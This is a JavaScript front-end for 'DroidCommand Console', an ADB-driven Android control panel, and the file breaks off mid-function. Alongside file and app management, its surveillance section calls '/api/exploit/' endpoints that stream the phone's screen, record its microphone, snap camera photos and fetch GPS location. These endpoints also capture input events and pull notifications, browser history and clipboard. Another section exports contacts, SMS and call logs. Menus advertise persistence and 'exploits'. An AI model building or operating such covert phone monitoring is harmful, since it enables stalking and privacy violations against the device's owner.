/* ============================================================
   DroidCommand Console v3.0 — front-end logic
   All requests carry X-API-Token (injected by index.html wrapper).
   ============================================================ */
"use strict";

/* ---------- tiny DOM + format helpers ---------- */

const $  = (sel) => document.querySelector(sel);
const $$ = (sel) => Array.from(document.querySelectorAll(sel));

function esc(s) {
  return String(s ?? "").replace(/[&<>"']/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
  }[c]));
}

const nowStamp = () => new Date().toLocaleTimeString([], { hour12: false });

/* ---------- toasts ---------- */

function toast(msg, type = "info", ms = 4200) {
  const el = document.createElement("div");
  el.className = `toast ${type}`;
  el.innerHTML = `<span class="t-time">${nowStamp()}</span>${esc(msg)}`;
  $("#toasts").appendChild(el);
  setTimeout(() => {
    el.classList.add("leaving");
    setTimeout(() => el.remove(), 300);
  }, ms);
}

/* ---------- modal ---------- */

const Modal = {
  open(title, bodyHtml) {
    $("#modalTitle").textContent = title;
    $("#modalBody").innerHTML = bodyHtml;
    $("#modalRoot").classList.remove("hidden");
  },
  close() { $("#modalRoot").classList.add("hidden"); }
};
$("#modalClose").addEventListener("click", Modal.close);
$(".modal-backdrop").addEventListener("click", Modal.close);
document.addEventListener("keydown", (e) => { if (e.key === "Escape") Modal.close(); });

/* ---------- api layer ---------- */

async function apiFetch(path, opts = {}) {
  let res;
  try {
    res = await fetch(path, opts);
  } catch (e) {
    throw new Error(`network error: ${e.message}`);
  }
  if (!res.ok) {
    let detail = "";
    try {
      const j = await res.json();
      detail = j.error || j.message || "";
    } catch (_) { /* non-json */ }
    throw new Error(`${res.status} ${res.statusText}${detail ? " — " + detail : ""}`);
  }
  const ct = res.headers.get("content-type") || "";
  return ct.includes("application/json") ? res.json() : res.text();
}

const API = {
  get:  (path)          => apiFetch(path),
  post: (path, body)    => apiFetch(path, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body || {})
  }),
  form: (path, formData) => apiFetch(path, { method: "POST", body: formData }),
  /** fetch an authed binary as an object URL (images/audio/video/downloads) */
  blobUrl: async (path) => {
    const res = await fetch(path);
    if (!res.ok) throw new Error(`${res.status} ${res.statusText}`);
    return URL.createObjectURL(await res.blob());
  },
  /** fetch an authed binary and hand it to the browser as a download */
  download: async (path, filename) => {
    const url = await API.blobUrl(path);
    const a = Object.assign(document.createElement("a"), { href: url, download: filename });
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 30_000);
  }
};

/** wrap an action so failures surface as error toasts instead of console silence */
function guard(btn, fn) {
  return async (...args) => {
    if (btn) btn.disabled = true;
    try {
      await fn(...args);
    } catch (e) {
      toast(e.message, "err", 6000);
    } finally {
      if (btn) btn.disabled = false;
    }
  };
}

const IMG_EXTS = ["jpg", "jpeg", "png", "webp", "gif", "bmp", "heic"];
const extOf = (p) => (p.split(".").pop() || "").toLowerCase();

function kvGrid(obj, order = null) {
  const keys = order ? order.filter(k => k in obj).concat(Object.keys(obj).filter(k => !order.includes(k)))
                     : Object.keys(obj);
  return `<div class="kv-grid">` + keys.map(k =>
    `<div class="kv-item"><div class="kv-key">${esc(k)}</div><div class="kv-val">${esc(obj[k])}</div></div>`
  ).join("") + `</div>`;
}

function boolBadge(v, tLabel = "yes", fLabel = "no") {
  return `<span class="badge ${v ? "ok" : "dim"}">${v ? tLabel : fLabel}</span>`;
}

/* ============================================================
   ROUTER
   ============================================================ */

const VIEW_META = {
  dashboard:    ["Dashboard",     "// telemetry"],
  files:        ["Files",         "// shared storage"],
  apps:         ["Apps",          "// packages"],
  media:        ["Media",         "// photos · video · audio"],
  comms:        ["Comms",         "// contacts · sms · calls"],
  terminal:     ["Terminal",      "// adb shell"],
  surveillance: ["Surveillance",  "// live sensors"],
  toolkit:      ["Toolkit",       "// audit & mods"],
  deep:         ["Deep Access",   "// shell-uid maximum"],
  network:      ["Network / CVE", "// recon & lab"],
  persistence:  ["Persistence",   "// adb over wifi"],
  warroom:      ["War Room",      "// tactical ops & exploits"],
};

const viewInited = {};
const viewInit = {
  dashboard: initDashboard,
  files: initFiles,
  apps: initApps,
  media: initMedia,
  comms: initComms,
  terminal: initTerminal,
  surveillance: initSurveillance,
  toolkit: initToolkit,
  deep: initDeep,
  network: initNetwork,
  persistence: initPersistence,
  warroom: initWarRoom,
};

function goto(view) {
  $$(".nav-btn").forEach(b => b.classList.toggle("active", b.dataset.view === view));
  $$(".view").forEach(v => v.classList.toggle("active", v.id === `view-${view}`));
  const [title, kicker] = VIEW_META[view] || [view, ""];
  $("#viewTitle").textContent = title;
  $("#viewKicker").textContent = kicker;
  if (!viewInited[view]) {
    viewInited[view] = true;
    viewInit[view]?.();
  }
}

$$(".nav-btn").forEach(b => b.addEventListener("click", () => goto(b.dataset.view)));
$$("[data-goto]").forEach(b =>
  b.addEventListener("click", () => goto(b.dataset.goto)));

$("#btnLockInfo").addEventListener("click", () => {
  Modal.open("console security model", `
    <p style="margin-bottom:10px">This console binds to <b>127.0.0.1</b> only and rejects requests whose
    Host header isn't localhost (DNS-rebinding guard).</p>
    <p style="margin-bottom:10px">Every <span class="mono">/api/</span> route requires the token stored in
    <span class="mono">DroidCommand/.api_token</span>. The UI receives it automatically at page render;
    anything else — other tabs, other origins — gets a 401.</p>
    <p>Cross-origin reads are blocked outright: wildcard CORS was removed. If you ever see this page served
    from anything except localhost, close it.</p>`);
});

/* ============================================================
   DEVICE STATUS POLLING (topbar pill)
   ============================================================ */

let lastStatus = null;

async function pollStatus() {
  try {
    const s = await API.get("/api/device/status");
    lastStatus = s;
    const pill = $("#devPill");
    const connected = s.connected;
    pill.classList.toggle("on", connected);
    pill.classList.toggle("off", !connected);
    const d = s.devices?.[0];
    $("#devPillText").textContent = connected && d
      ? `${d.model || d.serial} · ${d.status}`
      : (s.devices?.some(x => x.status === "unauthorized")
          ? "device unauthorized"
          : "no device");
  } catch (_) {
    $("#devPillText").textContent = "server unreachable";
  }
}
setInterval(pollStatus, 6000);

/* ============================================================
   DASHBOARD
   ============================================================ */

const RING_LEN = 289.03;

function setBattery(level, scale, stateTxt) {
  const pct = scale > 0 ? Math.round((level / scale) * 100) : 0;
  $("#battRing").style.strokeDashoffset = RING_LEN * (1 - pct / 100);
  $("#battRing").style.stroke = pct <= 15 ? "var(--bad)" : pct <= 35 ? "#E0A052" : "var(--vfd)";
  $("#battPct").textContent = `${pct}%`;
  $("#battState").textContent = stateTxt || "";
}

async function refreshDashboard() {
  const jobs = [
    API.get("/api/device/info"),
    API.get("/api/device/battery"),
    API.get("/api/device/storage"),
    API.get("/api/device/memory"),
  ];
  const [info, batt, stor, mem] = await Promise.all(jobs);

  $("#dName").textContent = info.model !== "Unknown" ? info.model : (lastStatus?.devices?.[0]?.model || "—");
  $("#dBrand").textContent = `${info.manufacturer} / ${info.brand}`;
  $("#dAndroid").textContent = `Android ${info.android_version} (sdk ${info.sdk_version})`;
  $("#dPatch").textContent = `patch ${info.security_patch}`;
  $("#dSerial").textContent = info.serial;

  setBattery(batt.level, batt.scale || 100, `${batt.plugged} · ${batt.temperature_c}°C`);

  // memory bar
  const ramPct = mem.used_pct || 0;
  $("#ramBar").style.width = `${ramPct}%`;
  $("#ramTxt").textContent = `${mem.used_mb} / ${mem.total_mb} MB used`;
  $("#ramPct").textContent = `${ramPct}%`;

  // storage rows
  const rows = (Array.isArray(stor) ? stor : []).slice(0, 4).map(v => `
    <div class="storage-row">
      <div class="srow-top"><span>${esc(v.mounted)}</span><span>${esc(v.used)} / ${esc(v.size)} (${esc(v.use_pct)})</span></div>
      <div class="bar-wrap"><div class="bar" style="width:${Math.min(100, parseInt(v.use_pct) || 0)}%"></div></div>
    </div>`).join("");
  $("#storageRows").innerHTML = rows || `<div class="dim small">no volumes reported</div>`;

  // identity kv
  $("#infoGrid").innerHTML = kvGrid(info, [
    "model", "manufacturer", "android_version", "sdk_version",
    "cpu_abi", "screen_res", "screen_density", "uptime", "hostname"
  ]);
}

function initDashboard() {
  refreshDashboard().catch(e => toast(e.message, "err"));
  $("#btnReloadInfo").addEventListener("click", guard(null, refreshDashboard));

  $("#qaShot").addEventListener("click", guard($("#qaShot"), async () => {
    const url = await API.blobUrl("/api/system/screenshot");
    Modal.open("screenshot", `<img src="${url}" alt="device screenshot">`);
  }));

  // reboot dropdown
  const menu = $("#rebootMenu");
  $("#qaReboot").addEventListener("click", (e) => {
    const r = e.currentTarget.getBoundingClientRect();
    menu.style.left = `${r.left}px`;
    menu.style.top = `${r.bottom + 6}px`;
    menu.classList.remove("hidden");
  });
  menu.querySelectorAll("button").forEach(b => b.addEventListener("click", async () => {
    menu.classList.add("hidden");
    const mode = b.dataset.mode;
    try {
      await API.post("/api/system/reboot", { mode });
      toast(`reboot (${mode}) sent`, "ok");
    } catch (e2) { toast(e2.message, "err"); }
  }));
  document.addEventListener("click", (e) => {
    if (!menu.contains(e.target) && e.target.id !== "qaReboot") menu.classList.add("hidden");
  });

  $("#btnDashLogcat").addEventListener("click", () => {
    goto("terminal");
    setTimeout(() => $("#btnLogcat").click(), 60);
  });
}

/* ============================================================
   FILES
   ============================================================ */

const Files = { path: "/sdcard" };

function fileRow(it) {
  const isImg = !it.is_dir && IMG_EXTS.includes(extOf(it.name));
  const icon = it.is_dir ? "&#9639;" : it.is_link ? "&#8594;" : "&#9636;";
  const actions = [];
  if (!it.is_dir) {
    actions.push(`<button class="mini-btn" data-act="dl">&darr;</button>`);
    if (isImg || ["txt", "log", "json", "xml", "html", "conf", "mp3", "mp4"].includes(extOf(it.name)))
      actions.push(`<button class="mini-btn" data-act="view">eye</button>`);
  }
  actions.push(`<button class="mini-btn" data-act="mv">ren</button>`);
  actions.push(`<button class="mini-btn danger" data-act="rm">del</button>`);

  return `<tr data-path="${esc(it.path)}" data-dir="${it.is_dir ? 1 : 0}" data-link="${it.is_link ? 1 : 0}">
    <td><span class="fname ${it.is_dir ? "dir-name" : ""}">${icon} ${esc(it.name)}</span>
        ${it.link_target ? `<div class="fsub">&#8594; ${esc(it.link_target)}</div>` : ""}</td>
    <td class="mono-num">${it.is_dir ? "—" : esc(it.size_formatted)}</td>
    <td class="mono-num">${esc(it.permissions)}</td>
    <td class="right"><span class="row-actions-inline">${actions.join("")}</span></td>
  </tr>`;
}

async function loadFiles() {
  const data = await API.get(`/api/files/list?path=${encodeURIComponent(Files.path)}`);
  Files.path = data.path || Files.path;
  $("#filesPathInput").value = Files.path;

  // breadcrumbs
  const parts = Files.path.split("/").filter(Boolean);
  let acc = "";
  $("#filesCrumbs").innerHTML =
    `<span class="crumb" data-p="/">/</span>` + parts.map(p => {
      acc += "/" + p;
      return `<span class="crumb" data-p="${esc(acc)}">${esc(p)}</span>`;
    }).join(` <span class="dim">/</span> `);
  $$("#filesCrumbs .crumb").forEach(c =>
    c.addEventListener("click", () => { Files.path = c.dataset.p; loadFiles(); }));

  $("#filesBody").innerHTML = data.items.map(fileRow).join("")
    || `<tr><td colspan="4" class="dim">empty directory</td></tr>`;
  $("#filesCount").textContent = `${data.count ?? data.items.length} items`;

  if (data.error) toast(data.error, "warn");

  // row interactions
  $$("#filesBody tr").forEach(tr => {
    tr.querySelector(".fname")?.addEventListener("click", () => {
      if (tr.dataset.dir === "1" || tr.dataset.link === "1") {
        Files.path = tr.dataset.path;
        loadFiles();
      }
    });
    tr.querySelectorAll("[data-act]").forEach(btn => btn.addEventListener("click", async (e) => {
      e.stopPropagation();
      const p = tr.dataset.path, act = btn.dataset.act;
      if (act === "dl") await API.download(`/api/files/download?path=${encodeURIComponent(p)}`, p.split("/").pop());
      else if (act === "view") openFileViewer(p);
      else if (act === "rm") {
        if (!confirm(`Delete ${p}? This runs rm -rf.`)) return;
        const r = await API.post("/api/files/delete", { path: p });
        r.success === false ? toast(r.error || "delete failed", "err") : (toast("deleted", "ok"), loadFiles());
      } else if (act === "mv") {
        const nn = prompt("Rename to (full path):", p);
        if (!nn || nn === p) return;
        const r = await API.post("/api/files/rename", { old_path: p, new_path: nn });
        r.success === false ? toast(r.error || "rename failed", "err") : (toast("renamed", "ok"), loadFiles());
      }
    }));
  });
}

async function openFileViewer(p) {
  if (IMG_EXTS.includes(extOf(p))) {
    const url = await API.blobUrl(`/api/files/view?path=${encodeURIComponent(p)}`);
    Modal.open(p.split("/").pop(), `<img src="${url}">`);
    return;
  }
  const r = await API.get(`/api/files/view?path=${encodeURIComponent(p)}`);
  Modal.open(p.split("/").pop(),
    r.success
      ? `<pre class="log-box" style="max-height:60vh">${esc(r.content)}</pre>`
      : `<p class="dim">${esc(r.error || "cannot read file")}</p>`);
}

function initFiles() {
  loadFiles().catch(e => toast(e.message, "err"));

  $("#filesUp").addEventListener("click", async () => {
    const cur = await API.get(`/api/files/list?path=${encodeURIComponent(Files.path)}`);
    Files.path = cur.parent_path || "/";
    loadFiles();
  });
  $("#filesGo").addEventListener("click", () => {
    const v = $("#filesPathInput").value.trim();
    if (v) { Files.path = v; loadFiles(); }
  });
  $("#filesPathInput").addEventListener("keydown", (e) => { if (e.key === "Enter") $("#filesGo").click(); });
  $("#filesRefresh").addEventListener("click", guard(null, loadFiles));

  $("#filesMkdir").addEventListener("click", guard(null, async () => {
    const name = prompt("New directory name:");
    if (!name) return;
    const p = `${Files.path.replace(/\/$/, "")}/${name}`;
    const r = await API.post("/api/files/mkdir", { path: p });
    r.success === false ? toast(r.error || "mkdir failed", "err") : (toast("created", "ok"), loadFiles());
  }));

  $("#filesUploadBtn").addEventListener("click", () => $("#filesUploadInput").click());
  $("#filesUploadInput").addEventListener("change", guard(null, async (e) => {
    const f = e.target.files[0];
    if (!f) return;
    const fd = new FormData();
    fd.append("file", f);
    fd.append("remote_dir", Files.path);
    const r = await API.form("/api/files/upload", fd);
    r.success === false ? toast(r.error || "upload failed", "err") : (toast(`uploaded ${f.name}`, "ok"), loadFiles());
    e.target.value = "";
  }));

  $("#filesSearchGo").addEventListener("click", guard(null, async () => {
    const q = $("#filesSearch").value.trim();
    if (!q) return loadFiles();
    const r = await API.get(`/api/files/search?path=${encodeURIComponent(Files.path)}&q=${encodeURIComponent(q)}`);
    $("#filesBody").innerHTML = (r.items || []).map(fileRow).join("")
      || `<tr><td colspan="4" class="dim">no matches</td></tr>`;
    $("#filesCount").textContent = `${r.count ?? 0} matches`;
  }));
}

/* ============================================================
   APPS
   ============================================================ */

const Apps = { type: "user", all: [] };

function appRow(a) {
  const pkg = typeof a === "string" ? a : (a.package || a.pkg || "");
  const ver = typeof a === "object" ? (a.version || "") : "";
  const path = typeof a === "object" ? (a.path || "") : "";
  return `<tr data-pkg="${esc(pkg)}">
    <td><span class="fname">${esc(pkg)}</span>${path ? `<div class="fsub">${esc(path)}</div>` : ""}</td>
    <td class="mono-num">${esc(ver || "—")}</td>
    <td class="right"><span class="row-actions-inline">
      <button class="mini-btn acc" data-act="launch">run</button>
      <button class="mini-btn" data-act="stop">stop</button>
      <button class="mini-btn" data-act="details">info</button>
      <button class="mini-btn" data-act="extract">apk</button>
      <button class="mini-btn danger" data-act="clear">clear</button>
      <button class="mini-btn danger" data-act="uninstall">uninst</button>
    </span></td>
  </tr>`;
}

function renderApps() {
  const q = $("#appsSearch").value.trim().toLowerCase();
  const shown = q ? Apps.all.filter(a => JSON.stringify(a).toLowerCase().includes(q)) : Apps.all;
  $("#appsBody").innerHTML = shown.slice(0, 400).map(appRow).join("")
    || `<tr><td colspan="3" class="dim">no packages${q ? " match filter" : " loaded"}</td></tr>`;
  bindAppRows();
}

function bindAppRows() {
  $$("#appsBody tr").forEach(tr => {
    const pkg = tr.dataset.pkg;
    tr.querySelectorAll("[data-act]").forEach(btn => btn.addEventListener("click", guard(null, async (e) => {
      e.stopPropagation();
      const act = btn.dataset.act;
      if (act === "launch") { const r = await API.post("/api/apps/launch", { package: pkg }); r.success === false ? toast(r.error || "launch failed", "err") : toast(`launched ${pkg}`, "ok"); }
      else if (act === "stop") { await API.post("/api/apps/stop", { package: pkg }); toast("force-stopped", "ok"); }
      else if (act === "clear") {
        if (!confirm(`Clear ALL data of ${pkg}?`)) return;
        const r = await API.post("/api/apps/clear", { package: pkg });
        r.success === false ? toast(r.error || "clear failed", "err") : toast("data cleared", "ok");
      } else if (act === "uninstall") {
        if (!confirm(`Uninstall ${pkg}?`)) return;
        const r = await API.post("/api/apps/uninstall", { package: pkg });
        r.success === false ? toast(r.error || "uninstall failed", "err") : (toast("uninstalled", "ok"), loadApps());
      } else if (act === "extract") {
        await API.download(`/api/apps/extract?package=${encodeURIComponent(pkg)}`, `${pkg}.apk`);
      } else if (act === "details") {
        const d = await API.get(`/api/apps/details?package=${encodeURIComponent(pkg)}`);
        Modal.open(pkg, kvGrid(d));
      }
    })));
  });
}

async function loadApps() {
  const r = await API.get(`/api/apps/list?type=${Apps.type}`);
  Apps.all = r.apps || [];
  renderApps();
  toast(`${Apps.all.length} packages`, "ok", 1800);
}

function initApps() {
  loadApps().catch(e => toast(e.message, "err"));
  $$("#appsSeg .seg-btn").forEach(b => b.addEventListener("click", () => {
    $$("#appsSeg .seg-btn").forEach(x => x.classList.toggle("active", x === b));
    Apps.type = b.dataset.type;
    loadApps().catch(e => toast(e.message, "err"));
  }));
  $("#appsSearch").addEventListener("input", renderApps);
  $("#appsRefresh").addEventListener("click", guard(null, loadApps));
  $("#appsInstallBtn").addEventListener("click", () => $("#appsInstallInput").click());
  $("#appsInstallInput").addEventListener("change", guard(null, async (e) => {
    const f = e.target.files[0];
    if (!f) return;
    const fd = new FormData();
    fd.append("apk", f);
    toast(`installing ${f.name}…`);
    const r = await API.form("/api/apps/install", fd);
    r.success === false ? toast(r.error || "install failed", "err") : toast("installed", "ok");
    e.target.value = "";
  }));
}

/* ============================================================
   MEDIA
   ============================================================ */

const Media = { type: "photos" };

const MEDIA_ICON = { videos: "VIDEO", audio: "AUDIO", downloads: "FILE" };

async function loadMedia() {
  const r = await API.get(`/api/media/list?type=${Media.type}`);
  const items = r.items || [];
  $("#mediaCount").textContent = `${items.length} items`;
  $("#mediaEmpty").classList.toggle("hidden", items.length > 0);

  const grid = $("#mediaGrid");
  grid.innerHTML = items.map((m, i) => `
    <div class="media-tile" data-i="${i}" data-path="${esc(m.path)}">
      <div class="media-thumb" id="mt-${i}">${MEDIA_ICON[Media.type] || "IMG"}</div>
      <div class="media-meta" title="${esc(m.path)}">${esc(m.name)}</div>
    </div>`).join("");

  // thumbnails for photos only (cheap cap)
  if (Media.type === "photos") {
    items.slice(0, 60).forEach(async (m, i) => {
      try {
        const url = await API.blobUrl(`/api/media/preview?path=${encodeURIComponent(m.path)}`);
        $(`#mt-${i}`).innerHTML = `<img src="${url}" loading="lazy">`;
      } catch (_) { /* keep placeholder */ }
    });
  }

  $$(".media-tile").forEach(tile => tile.addEventListener("click", () => {
    const m = items[tile.dataset.i];
    const p = m.path, e = extOf(p);
    if (["mp4", "mkv", "mov", "webm", "3gp", "avi"].includes(e)) openMediaVideo(p);
    else if (["mp3", "m4a", "aac", "wav", "ogg", "flac"].includes(e)) openMediaAudio(p);
    else openFileViewer(p);
  }));
}

async function openMediaVideo(p) {
  const url = await API.blobUrl(`/api/files/download?path=${encodeURIComponent(p)}`);
  Modal.open(p.split("/").pop(), `<video controls autoplay src="${url}"></video>`);
}
async function openMediaAudio(p) {
  const url = await API.blobUrl(`/api/files/download?path=${encodeURIComponent(p)}`);
  Modal.open(p.split("/").pop(), `<audio controls src="${url}"></audio>`);
}

function initMedia() {
  loadMedia().catch(e => toast(e.message, "err"));
  $$("#mediaSeg .seg-btn").forEach(b => b.addEventListener("click", () => {
    $$("#mediaSeg .seg-btn").forEach(x => x.classList.toggle("active", x === b));
    Media.type = b.dataset.type;
    loadMedia().catch(e => toast(e.message, "err"));
  }));
}

/* ============================================================
   COMMS
   ============================================================ */

const Comms = { type: "contacts" };

const COMMS_COLS = {
  contacts: [["display_name", "Name"], ["number", "Number"], ["type", "Type"]],
  sms:      [["address", "Address"], ["body", "Message"], ["date", "Date"], ["type", "Box"]],
  calls:    [["name", "Name"], ["number", "Number"], ["date", "Date"], ["duration", "Dur(s)"], ["type", "Kind"]],
};
const SMS_BOX = { 1: "inbox", 2: "sent", 3: "draft", 4: "outbox", 5: "failed", 6: "queued" };
const CALL_KIND = { 1: "incoming", 2: "outgoing", 3: "missed", 4: "voicemail", 5: "rejected", 6: "blocked" };

async function loadComms() {
  const cols = COMMS_COLS[Comms.type];
  const keyMap = { contacts: "contacts", sms: "messages", calls: "calls" };
  const r = await API.get(`/api/comms/${Comms.type}`);
  const rowsRaw = r[keyMap[Comms.type]] || [];

  const cell = (row, k) => {
    let v = row[k] ?? "";
    if (Comms.type === "sms" && k === "type") v = SMS_BOX[v] || v;
    if (Comms.type === "calls" && k === "type") v = CALL_KIND[v] || v;
    return esc(String(v));
  };

  $("#commsHead").innerHTML = `<tr>${cols.map(([k, lbl]) => `<th>${lbl}</th>`).join("")}</tr>`;
  $("#commsBody").innerHTML = rowsRaw.map(row =>
    `<tr>${cols.map(([k]) => `<td>${cell(row, k)}</td>`).join("")}</tr>`).join("")
    || `<tr><td colspan="${cols.length}" class="dim">nothing returned</td></tr>`;
  toast(`${rowsRaw.length} records`, "ok", 1600);
}

function initComms() {
  loadComms().catch(e => toast(e.message, "err"));
  $$("#commsSeg .seg-btn").forEach(b => b.addEventListener("click", () => {
    $$("#commsSeg .seg-btn").forEach(x => x.classList.toggle("active", x === b));
    Comms.type = b.dataset.type;
    loadComms().catch(e => toast(e.message, "err"));
  }));
  const dl = (fmt) => API.download(
    `/api/comms/export?type=${Comms.type}&format=${fmt}`,
    `${Comms.type}_export.${fmt}`);
  $("#commsExportJson").addEventListener("click", guard(null, () => dl("json")));
  $("#commsExportCsv").addEventListener("click", guard(null, () => dl("csv")));
}

/* ============================================================
   TERMINAL
   ============================================================ */

const Term = { hist: [], idx: -1 };

function termAppend(text) {
  const out = $("#termOut");
  out.textContent += text + "\n";
  out.scrollTop = out.scrollHeight;
}

async function runTerm(cmd) {
  termAppend(`$ ${cmd}`);
  Term.hist.unshift(cmd);
  Term.idx = -1;
  const body = cmd.startsWith("adb ") ? { command: cmd } : { command: cmd };
  const r = await API.post("/api/terminal/exec", body);
  if (r.output) termAppend(r.output);
  if (!r.success && r.returncode !== 0) termAppend(`[exit ${r.returncode}]`);
}

function initTerminal() {
  $("#termIn").addEventListener("keydown", async (e) => {
    if (e.key === "Enter") {
      const cmd = e.target.value.trim();
      if (!cmd) return;
      e.target.value = "";
      await guard(null, () => runTerm(cmd))();
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      if (Term.hist.length) {
        Term.idx = Math.min(Term.idx + 1, Term.hist.length - 1);
        e.target.value = Term.hist[Term.idx];
      }
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      Term.idx = Math.max(Term.idx - 1, -1);
      e.target.value = Term.idx === -1 ? "" : Term.hist[Term.idx];
    }
  });

  $$(".chip-btn[data-cmd]").forEach(b =>
    b.addEventListener("click", guard(null, () => runTerm(b.dataset.cmd))));

  $("#btnLogcat").addEventListener("click", guard(null, () => runTerm("logcat -d -t 200")));
  $("#btnTermClear").addEventListener("click", () => { $("#termOut").textContent = ""; });
}

/* ============================================================
   SURVEILLANCE
   ============================================================ */

let streamSource = null;

function stageShow(imgUrl) {
  $("#mirrorStage").innerHTML = `<img src="${imgUrl}" alt="device screen">`;
}
function stageIdle(text = "no signal") {
  $("#mirrorStage").innerHTML = `<div>${text}</div>`;
}

function listRows(items, mainFn, subFn) {
  return (items || []).map(it =>
    `<div class="list-row"><span class="lr-main">${esc(mainFn(it))}</span><span class="lr-sub">${subFn ? esc(subFn(it)) : ""}</span></div>`
  ).join("") || `<div class="dim small">nothing returned</div>`;
}

function initSurveillance() {
  // --- mirror ---
  $("#ssFrame").addEventListener("click", guard($("#ssFrame"), async () => {
    const r = await API.get("/api/exploit/screen-frame");
    r.success ? stageShow(`data:image/jpeg;base64,${r.image_b64}`) : stageIdle(r.error || "capture failed");
  }));

  $("#ssStart").addEventListener("click", () => {
    if (streamSource) return;
    const url = `/api/exploit/screen-stream?token=${encodeURIComponent(window.__DC_TOKEN)}`;
    streamSource = new EventSource(url);
    stageIdle("connecting…");
    streamSource.onmessage = (ev) => {
      try {
        const d = JSON.parse(ev.data);
        stageShow(`data:image/jpeg;base64,${d.image}`);
      } catch (_) {}
    };
    streamSource.onerror = () => stopStream("stream ended (server cap or device lost)");
    $("#ssStart").classList.add("hidden");
    $("#ssStop").classList.remove("hidden");
  });

  function stopStream(msg) {
    streamSource?.close();
    streamSource = null;
    $("#ssStart").classList.remove("hidden");
    $("#ssStop").classList.add("hidden");
    if (msg) { stageIdle(); toast(msg, "warn"); }
  }
  $("#ssStop").addEventListener("click", () => stopStream("stream stopped"));

  // --- mic --- (endpoint returns the recording as a raw file, not JSON)
  $("#micRec").addEventListener("click", guard($("#micRec"), async () => {
    toast("recording…");
    const res = await fetch("/api/exploit/mic-record", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ duration: +$("#micDur").value || 10 })
    });
    const ct = (res.headers.get("content-type") || "");
    if (ct.includes("application/json")) {
      const j = await res.json().catch(() => ({}));
      throw new Error(j.error || `record failed (${res.status})`);
    }
    if (!res.ok) throw new Error(`record failed (${res.status})`);
    const url = URL.createObjectURL(await res.blob());
    $("#micResult").innerHTML =
      `<audio controls src="${url}"></audio><br>
       <a class="ghost-btn block" style="text-align:center;margin-top:8px" href="${url}" download="dc_audio.mp4">save audio</a>`;
    toast("audio captured", "ok");
  }));

  // --- camera --- (endpoint returns the photo as a raw file, not JSON)
  $("#camCap").addEventListener("click", guard($("#camCap"), async () => {
    const res = await fetch("/api/exploit/camera-capture", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ camera_id: +$("#camSel").value })
    });
    const ct = (res.headers.get("content-type") || "");
    if (ct.includes("application/json")) {
      const j = await res.json().catch(() => ({}));
      throw new Error(j.error || `capture failed (${res.status})`);
    }
    if (!res.ok) throw new Error(`capture failed (${res.status})`);
    const url = URL.createObjectURL(await res.blob());
    $("#camResult").innerHTML =
      `<img src="${url}" style="max-width:100%;border-radius:3px">
       <a class="ghost-btn block" style="text-align:center;margin-top:8px" href="${url}" download="dc_photo.jpg">save photo</a>`;
    toast("photo captured", "ok");
  }));

  // --- gps ---
  $("#gpsGet").addEventListener("click", guard($("#gpsGet"), async () => {
    const r = await API.get("/api/exploit/gps-location");
    if (!r.success || r.lat == null) throw new Error(r.error || "no fix");
    const gmaps = `https://maps.google.com/?q=${r.lat},${r.lon}`;
    $("#gpsResult").innerHTML = `
      <div class="mono" style="margin-bottom:6px">${esc(r.lat)}, ${esc(r.lon)}
        ${r.accuracy ? `(±${esc(r.accuracy)}m)` : ""}</div>
      <a href="${gmaps}" target="_blank" rel="noopener" class="badge ok" style="text-decoration:none">open in maps</a>`;
  }));

  // --- remote input ---
  $("#riTextSend").addEventListener("click", guard(null, async () => {
    const t = $("#riText").value;
    if (!t) return;
    await API.post("/api/system/text", { text: t });
    toast("text sent", "ok");
  }));
  $("#riUrlSend").addEventListener("click", guard(null, async () => {
    const u = $("#riUrl").value.trim();
    if (!u) return;
    await API.post("/api/system/url", { url: u });
    toast("url opened", "ok");
  }));
  $("#riKeySend").addEventListener("click", guard(null, async () => {
    await API.post("/api/system/key", { code: +$("#riKey").value });
    toast("key sent", "ok");
  }));
  $("#tapSend").addEventListener("click", guard(null, async () => {
    await API.post("/api/system/tap", { x: +$("#tapX").value || 0, y: +$("#tapY").value || 0 });
    toast("tap sent", "ok");
  }));

  // --- events ---
  $("#keRun").addEventListener("click", guard($("#keRun"), async () => {
    $("#keOut").textContent = "capturing…";
    const r = await API.post("/api/exploit/capture-events", { duration: +$("#keDur").value || 5 });
    $("#keOut").textContent = (r.events || []).map(e =>
      typeof e === "string" ? e : JSON.stringify(e)).join("\n") || "(no events)";
  }));

  // --- notifications ---
  $("#notifGet").addEventListener("click", guard($("#notifGet"), async () => {
    const r = await API.get("/api/exploit/notifications");
    if (!r.success) throw new Error(r.error || "failed");
    $("#notifList").innerHTML = listRows(
      r.notifications || [],
      n => typeof n === "string" ? n : (n.title || n.text || n.package || JSON.stringify(n)),
      n => typeof n === "object" && n ? (n.package || n.when || "") : ""
    );
  }));

  // --- history ---
  $("#histGet").addEventListener("click", guard($("#histGet"), async () => {
    const r = await API.get("/api/exploit/browser-history");
    if (!r.success) throw new Error(r.error || "failed");
    const items = r.history || r.items || r.entries || [];
    $("#histList").innerHTML = listRows(
      items,
      h => h.title || h.url || JSON.stringify(h),
      h => h.visits != null ? `${h.visits}×` : ""
    );
  }));

  // --- clipboard ---
  $("#clipGet").addEventListener("click", guard($("#clipGet"), async () => {
    const r = await API.get("/api/exploit/clipboard");
    if (!r.success) throw new Error(r.error || "failed");
    const clips = r.clips || r.extracted_clips || r.clipboard || r.content;
    $("#clipOut").textContent = clips
      ? (typeof clips === "string" ? clips : JSON.stringify(clips, null, 2))
      : r.raw_dump || "(empty)";
  }));
}

/* ============================================================
   TOOLKIT
   ============================================================ */

function initToolkit() {
  $("#auditRun").addEventListener("click", guard($("#auditRun"), async () => {
    const r = await API.get("/api/toolkit/security-audit");
    const items = {
      root: boolBadge(r.is_rooted, "rooted", "not rooted"),
      crypto: `<span class="badge dim">${esc(r.crypto_state || "?")} / ${esc(r.crypto_type || "?")}</span>`,
      knox: `<span class="badge ${(r.knox_warranty_void ? "bad" : "ok")}">${r.knox_warranty_void ? "void" : "intact"}</span>`,
      bootloader: `<span class="badge ${r.bootloader_locked ? "ok" : "bad"}">${r.bootloader_locked ? "locked" : "unlocked"}</span>`,
    };
